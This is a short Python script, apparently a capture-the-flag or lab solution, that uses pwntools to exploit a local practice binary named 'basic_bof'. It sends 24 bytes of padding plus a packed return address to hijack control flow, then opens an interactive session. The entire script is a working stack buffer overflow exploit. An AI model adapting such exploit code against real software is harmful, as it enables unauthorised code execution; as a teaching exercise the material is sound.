from pwn import *

p = process('./basic_bof')
payload = (b"a"*24+p32(0x08049186))
print(payload)
p.sendline(payload)
p.interactive()

